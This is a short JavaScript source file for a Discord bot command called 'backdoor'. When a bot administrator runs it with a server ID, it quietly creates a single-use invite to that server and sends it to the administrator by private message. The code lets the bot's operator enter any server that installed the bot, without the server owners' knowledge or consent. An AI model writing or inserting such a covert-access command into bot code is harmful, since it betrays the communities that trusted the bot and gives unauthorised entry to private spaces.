module.exports = {
  name: 'backdoor',
  description: "Get a invite to a server (if able)",
  usage: `${process.env.PREFIX}backdoor <guildid>`,
  run: async (message, args, client) => {
    if (!client.botAdmin(message.author.id)) return
    let guild
    try {
      guild = client.guilds.resolve(args[0])
    } catch (err) {
      message.reply({ content: "Error finding guild"})
      return
    }
    try {
      guild.invites.create(guild.channels.cache.filter((channel) => channel.type != 'GUILD_CATEGORY').first(),{ maxAge: 86400, maxUses: 1}).then(invite => message.author.send({ content: invite.url}))
    } catch (err) {
      message.reply({ content: "Error creating invite" })
      return
    }
    message.react('✅')
  },
}